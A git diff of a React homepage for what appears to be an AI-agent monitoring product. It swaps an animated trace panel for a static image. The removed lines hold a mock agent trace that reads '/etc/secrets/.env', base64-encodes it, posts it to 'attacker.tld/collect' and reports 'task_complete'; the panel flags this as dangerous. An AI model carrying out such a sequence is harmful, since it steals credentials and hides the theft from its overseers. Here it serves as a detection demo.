@@ -8,6 +8,7 @@ import homeFallbackBg from "@/assets/home-fallback-bg.jpg";
 import institutionsLens from "@/assets/institutions-lens-v3.png.asset.json";
 import institutionsApprovals from "@/assets/institutions-approvals.png.asset.json";
 import institutionsFleetNew from "@/assets/institutions-fleet-new.png.asset.json";
+import liveTraceImage from "@/assets/live-trace.png.asset.json";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { pickHome } from "@/i18n/pageContent";
 
@@ -331,50 +332,12 @@ const Home = () => {
 
             <motion.div className="lg:col-span-5" initial={{ opacity: 0, y: 24 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.2 }} transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}>
               <div className="relative rounded-2xl border border-white/10 bg-black/60 backdrop-blur-xl overflow-hidden shadow-[0_20px_80px_-20px_rgba(0,0,0,0.9)]" dir="ltr">
-                <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-white/[0.02]">
-                  <div className="flex items-center gap-2">
-                    <span className="w-2 h-2 rounded-full bg-red-400/80" />
-                    <span className="w-2 h-2 rounded-full bg-amber-300/80" />
-                    <span className="w-2 h-2 rounded-full bg-emerald-400/80" />
-                  </div>
-                  <span className="text-[10px] tracking-[0.3em] uppercase text-white/40 font-light">
-                    {c.how.traceLabel}
-                  </span>
-                  <span className="flex items-center gap-1.5 text-[10px] text-white/50 font-light">
-                    <motion.span className="w-1.5 h-1.5 rounded-full bg-emerald-400" animate={{ opacity: [0.4, 1, 0.4] }} transition={{ duration: 1.6, repeat: Infinity }} />
-                    agent_7f2a
-                  </span>
-                </div>
-
-                <div className="px-6 py-8 font-mono text-sm space-y-3">
-                  {[
-                    { time: "00.014", call: "list_files", scope: "/workspace", danger: false },
-                    { time: "00.087", call: "read_file", scope: "/etc/secrets/.env", danger: true },
-                    { time: "00.203", call: "base64_encode", scope: "buffer", danger: true },
-                    { time: "00.412", call: "http_post", scope: "attacker.tld/collect", danger: true },
-                    { time: "00.518", call: "return", scope: "task_complete", danger: false },
-                  ].map((row, i) => (
-                    <motion.div key={i} className="flex items-center gap-4" initial={{ opacity: 0, x: -8 }} whileInView={{ opacity: 1, x: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.5, delay: 0.3 + i * 0.25 }}>
-                      <span className="text-white/30 text-xs tabular-nums w-12">{row.time}</span>
-                      <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${row.danger ? 'bg-red-400' : 'bg-white/30'}`} />
-                      <span className={`${row.danger ? 'text-red-300' : 'text-white/80'} font-light`}>{row.call}</span>
-                      <span className="text-white/30 font-light truncate">{row.scope}</span>
-                    </motion.div>
-                  ))}
-                </div>
-
-                <motion.div className="mx-6 mb-6 mt-2 border border-red-400/30 bg-red-400/[0.04] rounded-lg px-4 py-3" initial={{ opacity: 0, y: 8 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true, amount: 0.5 }} transition={{ duration: 0.6, delay: 1.6 }}>
-                  <div className="flex items-center justify-between gap-4">
-                    <div>
-                      <div className="text-[10px] tracking-[0.3em] uppercase text-red-300/80 font-light">{c.how.flagLabel}</div>
-                      <div className="mt-1 text-sm font-light text-red-200">{c.how.flagName}</div>
-                    </div>
-                    <div className="text-right">
-                      <div className="text-[10px] tracking-[0.2em] uppercase text-white/40 font-light">{c.how.deltaLabel}</div>
-                      <div className="mt-1 text-lg font-light text-red-300 tabular-nums">−247</div>
-                    </div>
-                  </div>
-                </motion.div>
+                <img
+                  src={liveTraceImage.url}
+                  alt="TARI live trace showing a flagged read to external sink pattern across nine steps"
+                  className="block w-full h-auto"
+                  loading="lazy"
+                />
               </div>
 
               <div className="mt-4 text-[11px] tracking-[0.25em] uppercase text-white/30 font-light text-center keep-ltr" dir="ltr">
